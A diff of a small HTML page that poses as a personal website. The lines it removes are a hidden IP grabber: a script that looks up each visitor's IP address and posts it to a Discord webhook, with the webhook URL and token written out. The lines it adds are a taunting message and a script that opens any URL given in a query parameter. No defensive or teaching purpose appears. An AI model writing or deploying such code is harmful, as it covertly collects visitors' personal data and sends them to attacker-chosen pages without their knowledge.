@@ -3,31 +3,11 @@
 <title>Hi</title>
 </head>
 <body>
-<p>Hi this is my website :3</p>
-<script src=
-"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+<p>Wow you didnt get taken, skill issue :hehehehha: fucking NERD</p>
+    <script>
+        const url = urlParams.get('urlname')
+        console.log(url);
+        window.open(url, "_blank").focus()
     </script>
-     
-      <script>
-                
-    $.getJSON("https://cors-anywhere.herokuapp.com/https://europe-west3-devrcc.cloudfunctions.net/whatismyip", function(data) {
-         
-        // Setting text of element P with id gfg
-        const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    const params = {
-      username: "Hi :3",
-      avatar_url: "",
-      content: data.ip
-    }
-
-    request.send(JSON.stringify(params));
-    })
-    </script>
-<script>
-</script>
 </body>
 </html>
